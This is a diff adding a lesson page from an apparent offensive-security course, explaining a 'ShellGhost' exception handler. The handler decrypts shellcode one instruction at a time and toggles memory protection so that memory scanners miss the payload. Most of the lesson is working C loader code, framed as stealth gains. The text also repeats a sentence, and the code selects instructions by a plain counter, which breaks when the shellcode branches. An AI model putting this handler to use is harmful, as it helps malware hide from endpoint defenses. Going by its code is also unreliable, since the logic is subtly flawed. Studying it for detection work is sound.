@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 6: The VEH Handler Implementation - ShellGhost Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F47B;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#64748b;--accent2:#475569;--gradient:linear-gradient(135deg,#64748b,#475569)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>ShellGhost Course</h2>
+<span>Single-Instruction Evasion</span>
+</div>
+<a class="home-link" href="../ShellGhost_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Memory Scanner Evasion Goals</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Software Breakpoints &amp; INT3</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Vectored Exception Handling</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. The ShellGhost Concept</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. SystemFunction032 &amp; Shellcode Mapping</span><span class="diff d2">d2</span></a>
+<a class="mod-link active" href="module6.html"><span>6. VEH Handler Implementation</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. Background: Trap Flag &amp; Single-Stepping</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge med">Difficulty: Intermediate</span>
+<h1>Module 6: The VEH Handler Implementation</h1>
+<p class="subtitle">Line by line through the exception handler that re-encrypts, decrypts, toggles RW/RX, and advances one instruction at a time.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Walk through the actual VEH handler implementation in detail. This module covers how the handler reads <code>ContextRecord-&gt;Rip</code> (already adjusted by the kernel) to identify the current position, re-encrypts the previous instruction, decrypts the current instruction using SystemFunction032, toggles memory protection between RW and RX via VirtualProtect, and resumes execution. All within a single EXCEPTION_BREAKPOINT handler &mdash; no trap flag, no EXCEPTION_SINGLE_STEP. Every line of the handler is explained.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Global State Recap</h2>
+
+<p>The VEH handler relies on global state that was initialized before execution began. Here is the complete state structure:</p>
+
+<pre><span class="lang-tag">C</span>// Global state accessible by the VEH handler
+static struct {
+    PBYTE   exec_base;      // Base address of RW execution buffer
+    SIZE_T  exec_size;      // Size of execution buffer
+    PBYTE   enc_shellcode;  // Per-instruction encrypted shellcode
+    SIZE_T  sc_size;        // Shellcode size
+
+    // Instruction mapping (from ShellGhost_mapping.py)
+    CRYPT_BYTES_QUOTA *map; // Array of per-instruction RVA + byte count
+    DWORD   num_instr;      // Total number of instructions
+    DWORD   current_index;  // Current instruction index
+
+    // RC4 key for SystemFunction032
+    BYTE    key[16];        // RC4 encryption key
+    USHORT  key_len;        // Key length
+
+    // Tracking state
+    INT     prev_index;     // Index of previously executed instruction (-1 if none)
+
+    // SystemFunction032 function pointer
+    _SystemFunction032 pSystemFunction032;
+} g_ctx;</pre>
+
+<!-- ============================================================ -->
+<h2>2. Handling EXCEPTION_BREAKPOINT</h2>
+
+<p>When the CPU hits a <code>0xCC</code> byte in the execution buffer, the handler must: validate the exception, re-encrypt the previous instruction, decrypt the current instruction, toggle memory protection, and resume. All in a single handler invocation.</p>
+
+<pre><span class="lang-tag">C</span>LONG CALLBACK GhostVehHandler(PEXCEPTION_POINTERS ep) {
+    PEXCEPTION_RECORD rec = ep->ExceptionRecord;
+    PCONTEXT ctx = ep->ContextRecord;
+
+    // ---- BREAKPOINT HANDLING ----
+    if (rec->ExceptionCode == EXCEPTION_BREAKPOINT) {
+        DWORD old_protect;
+
+        // Step 1: Get the address of the 0xCC byte.
+        // The kernel (KiDispatchException) already decremented RIP by 1,
+        // so ContextRecord->Rip points directly at the 0xCC byte.
+        PBYTE cc_addr = (PBYTE)ctx->Rip;
+
+        // Step 2: Validate - is this 0xCC in our execution buffer?
+        if (cc_addr < g_ctx.exec_base ||
+            cc_addr >= g_ctx.exec_base + g_ctx.exec_size) {
+            return EXCEPTION_CONTINUE_SEARCH;  // Not ours
+        }
+
+        // Step 3: Toggle memory to RW for writing
+        VirtualProtect(g_ctx.exec_base, g_ctx.exec_size,
+                        PAGE_READWRITE, &old_protect);
+
+        // Step 4: Re-encrypt the PREVIOUS instruction (if any)
+        if (g_ctx.prev_index >= 0) {
+            CRYPT_BYTES_QUOTA *prev = &g_ctx.map[g_ctx.prev_index];
+            // Write 0xCC back over previous instruction's bytes
+            memset(g_ctx.exec_base + prev->rva, 0xCC, prev->quota);
+        }
+
+        // Step 5: Decrypt the CURRENT instruction
+        CRYPT_BYTES_QUOTA *curr = &g_ctx.map[g_ctx.current_index];
+        // Copy encrypted bytes to execution buffer
+        memcpy(g_ctx.exec_base + curr->rva,
+               g_ctx.enc_shellcode + curr->rva, curr->quota);
+        // Decrypt in place using SystemFunction032 (RC4)
+        UNICODE_STRING data = {
+            curr->quota, curr->quota,
+            (PWSTR)(g_ctx.exec_base + curr->rva) };
+        UNICODE_STRING key = {
+            g_ctx.key_len, g_ctx.key_len,
+            (PWSTR)g_ctx.key };
+        g_ctx.pSystemFunction032(&data, &key);
+
+        // Step 6: Toggle memory to RX for execution
+        VirtualProtect(g_ctx.exec_base, g_ctx.exec_size,
+                        PAGE_EXECUTE_READ, &old_protect);
+
+        // Step 7: Update tracking state
+        g_ctx.prev_index = g_ctx.current_index;
+        g_ctx.current_index++;
+
+        // Rip already points to the decrypted instruction
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+
+    // Not our exception
+    return EXCEPTION_CONTINUE_SEARCH;
+}</pre>
+
+<div class="card">
+<h4>Step-by-Step Breakdown</h4>
+<table>
+<tr><th>Step</th><th>Operation</th><th>Why</th></tr>
+<tr><td>1</td><td><code>cc_addr = ctx-&gt;Rip</code></td><td>The kernel already decremented RIP by 1 for EXCEPTION_BREAKPOINT. No manual adjustment needed.</td></tr>
+<tr><td>2</td><td>Range check against exec_base</td><td>Ensures we only process breakpoints from our shellcode buffer, not from debuggers or other code.</td></tr>
+<tr><td>3</td><td>VirtualProtect to RW</td><td>The page is currently RX (executable). We need RW to write decrypted bytes.</td></tr>
+<tr><td>4</td><td>Re-encrypt previous instruction</td><td>Writes 0xCC back over the bytes of the previously executed instruction, restoring the "ghost" state.</td></tr>
+<tr><td>5</td><td>Decrypt current instruction via SystemFunction032</td><td>Copies encrypted bytes from the data buffer and decrypts them in place using RC4.</td></tr>
+<tr><td>6</td><td>VirtualProtect to RX</td><td>Toggles the page back to executable (RX) so the CPU can run the decrypted instruction. Avoids the RWX IoC.</td></tr>
+<tr><td>7</td><td>Update tracking indices</td><td>Records the current instruction as "previous" for the next handler invocation. Advances to the next instruction index.</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. The One-Exception Model</h2>
+
+<p>ShellGhost uses a <strong>one-exception-per-instruction</strong> model. There is no trap flag usage and no EXCEPTION_SINGLE_STEP handling. The key insight is that after executing a decrypted instruction, the CPU naturally hits the next <code>0xCC</code> byte in the buffer, which triggers another EXCEPTION_BREAKPOINT. The handler for that next breakpoint re-encrypts the previous instruction before decrypting the current one.</p>
+
+<div class="card green">
+<h4>Why No Trap Flag?</h4>
+<p>Many assume ShellGhost needs the trap flag (TF) to know when an instruction finishes executing. In reality, the 0xCC-filled buffer already provides this signal naturally. When the CPU finishes executing the decrypted instruction and advances to the next byte, it finds another <code>0xCC</code> and raises EXCEPTION_BREAKPOINT. This breakpoint is the signal that the previous instruction has completed. No trap flag, no EXCEPTION_SINGLE_STEP &mdash; just a clean sequence of EXCEPTION_BREAKPOINT events, one per instruction.</p>
+</div>
+
+<div class="card warn">
+<h4>Advantage: Simpler and Stealthier</h4>
+<p>By avoiding the trap flag entirely, ShellGhost avoids several detection vectors that would otherwise apply: hardware performance counters monitoring single-step exceptions, EXCEPTION_SINGLE_STEP event monitoring, and the doubled exception rate that a two-exception model would produce. The one-exception model generates half the exceptions compared to a breakpoint+single-step approach.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. The RIP Adjustment Explained</h2>
+
+<p>A common misconception is that the VEH handler must manually subtract 1 from RIP for EXCEPTION_BREAKPOINT. Here is the actual behavior:</p>
+
+<pre><span class="lang-tag">Text</span>Before INT3 executes:
+  Memory:  [0xCC] [0xCC] [0xCC] ...
+  RIP:     0x1000  (pointing at the first 0xCC)
+
+CPU executes 0xCC (INT3):
+  CPU internally advances RIP to 0x1001 (past the 1-byte INT3)
+  Traps to kernel via IDT vector 3
+
+Kernel (KiDispatchException):
+  For EXCEPTION_BREAKPOINT specifically, the kernel decrements RIP by 1
+  RIP is set back to 0x1000 before dispatching to user-mode
+
+VEH handler receives:
+  ContextRecord->Rip = 0x1000  (already adjusted by kernel)
+  ExceptionAddress   = 0x1000  (points to the 0xCC)
+  No manual RIP adjustment needed!
+
+VEH handler:
+  Decrypts instruction at 0x1000 (e.g., "48 89 E5" = mov rbp, rsp)
+  Toggles to RX, returns EXCEPTION_CONTINUE_EXECUTION
+
+CPU resumes at RIP = 0x1000:
+  Memory:  [0x48] [0x89] [0xE5] [0xCC] ...
+  Executes "mov rbp, rsp" (3 bytes), advances RIP to 0x1003
+  Hits 0xCC at 0x1003 -> next EXCEPTION_BREAKPOINT</pre>
+
+<div class="card green">
+<h4>The Kernel Does the Work</h4>
+<p>This kernel-level RIP adjustment is specific to EXCEPTION_BREAKPOINT (0x80000003). The Windows kernel (<code>KiDispatchException</code>) decrements the saved RIP by 1 before dispatching the exception to user-mode handlers. This is a well-known Windows kernel behavior that debuggers rely on. ShellGhost uses <code>ContextRecord-&gt;Rip</code> directly, without any subtraction.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>5. Per-Instruction Decryption via CRYPT_BYTES_QUOTA</h2>
+
+<p>ShellGhost knows exactly how many bytes each instruction occupies because this information was pre-computed by <code>ShellGhost_mapping.py</code>. The handler uses the <code>CRYPT_BYTES_QUOTA</code> struct to decrypt precisely the right number of bytes:</p>
+
+<pre><span class="lang-tag">C</span>// Decrypt the current instruction using mapping data
+CRYPT_BYTES_QUOTA *curr = &g_ctx.map[g_ctx.current_index];
+
+// Copy encrypted bytes from data buffer to execution buffer
+memcpy(g_ctx.exec_base + curr->rva,
+       g_ctx.enc_shellcode + curr->rva,
+       curr->quota);
+
+// Decrypt in place using SystemFunction032
+UNICODE_STRING data_str = {
+    (USHORT)curr->quota,
+    (USHORT)curr->quota,
+    (PWSTR)(g_ctx.exec_base + curr->rva)
+};
+UNICODE_STRING key_str = {
+    g_ctx.key_len, g_ctx.key_len,
+    (PWSTR)g_ctx.key
+};
+g_ctx.pSystemFunction032(&data_str, &key_str);
+
+// The exact bytes of this instruction are now decrypted in place
+// The handler knows the exact byte count from curr->quota</pre>
+
+<div class="card green">
+<h4>Precise Decryption Surface</h4>
+<p>Because the <code>CRYPT_BYTES_QUOTA</code> struct records the exact byte count of each instruction, ShellGhost decrypts exactly the number of bytes needed &mdash; no more, no less. The decryption surface at any instant is exactly one instruction (1&ndash;15 bytes). After the instruction executes and the next breakpoint handler runs, those bytes are overwritten with <code>0xCC</code>.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. API Calls from Shellcode</h2>
+
+<p>When the shellcode calls a Windows API (e.g., <code>call [rax]</code> where rax points to a function in kernel32.dll), execution leaves the execution buffer. The handler must account for this:</p>
+
+<p>When the shellcode calls a Windows API (e.g., <code>call [rax]</code> where rax points to a function in kernel32.dll), execution leaves the execution buffer. The API executes at full native speed. When the API returns (via <code>ret</code>), execution returns to the shellcode buffer at the next instruction. That byte is <code>0xCC</code>, so EXCEPTION_BREAKPOINT fires again and the cycle resumes naturally.</p>
+
+<div class="card">
+<h4>API Calls Are Free</h4>
+<p>Because ShellGhost uses only EXCEPTION_BREAKPOINT (no trap flag), API calls outside the execution buffer run at full native speed without any exception overhead. The cycle resumes automatically when the API returns and the CPU hits the next <code>0xCC</code> in the buffer. This is a significant advantage over a trap-flag-based approach, which would generate single-step exceptions through the entire API call chain.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. Complete Handler Assembly</h2>
+
+<pre><span class="lang-tag">C</span>LONG CALLBACK ShellGhostHandler(PEXCEPTION_POINTERS ep) {
+    PEXCEPTION_RECORD rec = ep->ExceptionRecord;
+    PCONTEXT ctx = ep->ContextRecord;
+    DWORD old_protect;
+
+    // ======= BREAKPOINT: Re-encrypt prev, decrypt current =======
+    if (rec->ExceptionCode == EXCEPTION_BREAKPOINT) {
+        // Rip already points at the 0xCC (kernel adjusted)
+        PBYTE cc_addr = (PBYTE)ctx->Rip;
+
+        // Boundary check
+        if (cc_addr < g_ctx.exec_base ||
+            cc_addr >= g_ctx.exec_base + g_ctx.exec_size)
+            return EXCEPTION_CONTINUE_SEARCH;
+
+        // Toggle to RW for writing
+        VirtualProtect(g_ctx.exec_base, g_ctx.exec_size,
+                        PAGE_READWRITE, &old_protect);
+
+        // Re-encrypt previously executed instruction
+        if (g_ctx.prev_index >= 0) {
+            CRYPT_BYTES_QUOTA *prev = &g_ctx.map[g_ctx.prev_index];
+            memset(g_ctx.exec_base + prev->rva, 0xCC, prev->quota);
+        }
+
+        // Decrypt current instruction via SystemFunction032
+        CRYPT_BYTES_QUOTA *curr = &g_ctx.map[g_ctx.current_index];
+        memcpy(g_ctx.exec_base + curr->rva,
+               g_ctx.enc_shellcode + curr->rva, curr->quota);
+        UNICODE_STRING data = {
+            (USHORT)curr->quota, (USHORT)curr->quota,
+            (PWSTR)(g_ctx.exec_base + curr->rva) };
+        UNICODE_STRING key = {
+            g_ctx.key_len, g_ctx.key_len,
+            (PWSTR)g_ctx.key };
+        g_ctx.pSystemFunction032(&data, &key);
+
+        // Toggle to RX for execution
+        VirtualProtect(g_ctx.exec_base, g_ctx.exec_size,
+                        PAGE_EXECUTE_READ, &old_protect);
+
+        // Advance instruction index
+        g_ctx.prev_index = g_ctx.current_index;
+        g_ctx.current_index++;
+
+        // Rip already correct, resume execution
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+
+    return EXCEPTION_CONTINUE_SEARCH;
+}</pre>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="D">
+<p>Q1: Why does the ShellGhost handler NOT subtract 1 from ContextRecord->Rip?</p>
+<div class="quiz-btn" data-choice="A">A) Because INT3 does not advance RIP</div>
+<div class="quiz-btn" data-choice="B">B) Because x64 addresses are already correct</div>
+<div class="quiz-btn" data-choice="C">C) Because ShellGhost uses hardware breakpoints instead</div>
+<div class="quiz-btn" data-choice="D">D) Because the Windows kernel (KiDispatchException) already decrements RIP by 1 before dispatching to user-mode</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q2: How does ShellGhost avoid the RWX memory indicator of compromise (IoC)?</p>
+<div class="quiz-btn" data-choice="A">A) It uses PAGE_NOACCESS memory</div>
+<div class="quiz-btn" data-choice="B">B) It allocates memory as RWX but hides the allocation</div>
+<div class="quiz-btn" data-choice="C">C) It allocates as PAGE_READWRITE and toggles to PAGE_EXECUTE_READ via VirtualProtect before execution</div>
+<div class="quiz-btn" data-choice="D">D) It writes shellcode to a legitimate DLL's .text section</div>
+</div>
+
+<div class="quiz-q" data-answer="B">
+<p>Q3: What happens when the shellcode calls a Windows API that lives outside the execution buffer?</p>
+<div class="quiz-btn" data-choice="A">A) The handler raises an access violation</div>
+<div class="quiz-btn" data-choice="B">B) The API runs at full native speed; when it returns, the next 0xCC triggers a new breakpoint and the cycle resumes</div>
+<div class="quiz-btn" data-choice="C">C) The API call fails because of the VEH handler</div>
+<div class="quiz-btn" data-choice="D">D) The shellcode must decrypt API addresses manually</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module5.html">&larr; Prev: SystemFunction032 &amp; Shellcode Mapping</a>
+<a class="primary" href="module7.html">Next: Background: Trap Flag &amp; Single-Stepping &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
